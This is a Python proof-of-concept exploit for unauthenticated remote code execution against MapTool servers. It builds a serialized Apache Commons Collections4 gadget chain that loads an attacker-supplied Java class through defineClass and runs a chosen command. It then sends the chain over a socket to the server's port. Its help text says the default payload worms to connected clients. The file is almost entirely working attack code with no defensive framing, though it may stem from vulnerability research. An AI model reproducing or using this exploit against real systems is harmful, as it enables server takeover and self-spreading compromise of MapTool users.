#!/usr/bin/env python3

from typing import Dict, Any, Iterable, BinaryIO, Sequence
from dataclasses import dataclass
from io import BufferedIOBase, BytesIO
from socket import socket, AF_INET, SOCK_STREAM
import argparse
import struct
import sys


class Serializable: pass


@dataclass
class Obj(Serializable):
    cls: str
    fields: Dict[str, Serializable]


@dataclass
class Vec(Serializable):
    cls: str
    items: Sequence[Serializable]


@dataclass
class Int4(Serializable):
    val: int


@dataclass
class String(Serializable):
    val: str


@dataclass
class Bytes(Serializable):
    val: bytes


@dataclass
class T(Serializable): pass


class Null(Serializable): pass


class Cerial:
    def __init__(self, stream: BinaryIO):
        self.stream = stream

    def raw_int4(self, val: int):
        self.stream.write(struct.pack('>I', val))

    def int4(self, val: int):
        self.type('I')
        self.raw_int4(val)

    def raw_int2(self, val: int):
        self.stream.write(struct.pack('>H', val))

    def int2(self, val: int):
        self.type('I')
        self.raw_int2(val)

    def raw_string(self, string: str):
        self.raw_int2(len(string))
        self.stream.write(string.encode('utf-8'))

    def string(self, string: str):
        self.type('S')
        self.raw_string(string)

    def bytes(self, b: bytes):
        self.type('B')
        self.raw_int2(len(b))
        self.stream.write(b)

    def type(self, string: str):
        self.stream.write(string.encode('utf-8'))

    def object(self, obj: Obj):
        self.type('Mt')
        self.raw_string(obj.cls)
        for k, v in obj.fields.items():
            self.string(k)
            self.cerial(v)
        self.type('z')

    def vector(self, vec: Vec):
        self.type('Vt')
        self.raw_string(vec.cls)
        self.type('l')
        self.raw_int4(len(vec.items))
        for i in vec.items:
            self.cerial(i)
        self.type('z')

    def cerial(self, s: Serializable):
        if   isinstance(s, Obj):  self.object(s)
        elif isinstance(s, Vec):  self.vector(s)
        elif isinstance(s, Int4): self.int4(s.val)
        elif isinstance(s, String): self.string(s.val)
        elif isinstance(s, Null): self.type('N')
        elif isinstance(s, T): self.type('T')
        elif isinstance(s, Bytes): self.bytes(s.val)
        else: raise ValueError('serializable')

def cc4(off: str) -> str: return f'org.apache.commons.collections4.{off}'
def arr(type: str) -> str: return f'[{type}'
def cls(name: str) -> Obj: return Obj('java.lang.Class', { 'name': String(name) })
def j(name: str) -> str: return f'java.lang.{name}'

def invoke(meth: str, param_types: Iterable[str], args: Sequence[Serializable]):
    return Obj(cc4('functors.InvokerTransformer'), {
        'iMethodName': String(meth),
        'iParamTypes': Vec(arr('java.lang.Class'), list(map(cls, param_types))),
        'iArgs': Vec(arr('object'), args)
    })

def tclosure(obj: Obj) -> Obj:
    return Obj(cc4('functors.TransformerClosure'), { 'iTransformer': obj })

# transformer chain
def tchain(transformers: Iterable[Serializable]) -> Obj:
    return Obj(cc4('functors.ChainedTransformer'), {
        'iTransformers': Vec(arr(cc4('Transformer')), list(transformers))
    })

# closure chain
def cchain(closures: Iterable[Serializable]) -> Obj:
    return Obj(cc4('functors.ChainedClosure'), {
        'iClosures': Vec(arr(cc4('Closure')), list(closures))
    })

def payload(cmd: str, stage2: bytes, stage3: Serializable):
    return Obj(cc4('keyvalue.TiedMapEntry'), {
        'map': Obj(cc4('FluentIterable'), {
            'iterable': Obj(cc4('IterableUtils$10'), {
                'val$iterable': Vec('java.util.HashSet', [cls(j('ClassLoader'))]),
                'val$transformer': tchain([
                    invoke('getDeclaredMethod', 
                        [j('String'), '[Ljava.lang.Class;'],
                        [String('defineClass'), Vec(arr(j('Class')), [
                            cls(j('String')), cls(arr('B')), cls('int'), cls('int')])]),
                    Obj(cc4('functors.ClosureTransformer'), {
                        'iClosure': cchain([
                            tclosure(invoke('setAccessible', ['boolean'], [T()])),
                            tclosure(tchain([
                                invoke('invoke', [j('Object'), '[Ljava.lang.Object;'], [
                                    Obj('java.security.SecureClassLoader', {}),
                                    Vec(arr(j('Object')), [
                                        String('fyi.catnip.Payload'),
                                        Bytes(stage2),
                                        Int4(0),
                                        Int4(len(stage2))])]),

                                invoke('getMethod', [j('String'), '[Ljava.lang.Class;'],
                                    [String('memes'), Vec(arr(j('Class')), [
                                        cls(j('String')), cls(arr('B'))])]),

                                invoke('invoke', [j('Object'), '[Ljava.lang.Object;'],
                                    [Null(), Vec(arr(j('Object')), [
                                        String(cmd), stage3])])
                            ]))
                        ])
                    })
                ])
            })
        })
    })

parser = argparse.ArgumentParser(description='maptool unauthenticated rce POC')
parser.add_argument('server_ip', metavar='ip', type=str, help='maptool server ip')
parser.add_argument('cmd', type=str, help='command to run')
parser.add_argument('-p', dest='port', type=int, default=51234,
        help='maptool server port')
parser.add_argument('--payload', dest='payload', type=str, default='payload.class',
        help='change the default payload. note that the default payload does the client worming')
args = parser.parse_args()

with open(args.payload, 'rb') as f: stage2 = f.read()

with BytesIO() as buf:
    Cerial(buf).cerial(payload(args.cmd, stage2, Null()))
    stage3 = Bytes(buf.getvalue())

stage1 = payload(args.cmd, stage2, stage3)

with socket(AF_INET, SOCK_STREAM) as s:
    s.connect((args.server_ip, args.port))
    Cerial(s.makefile(mode='wb')).cerial(stage1)
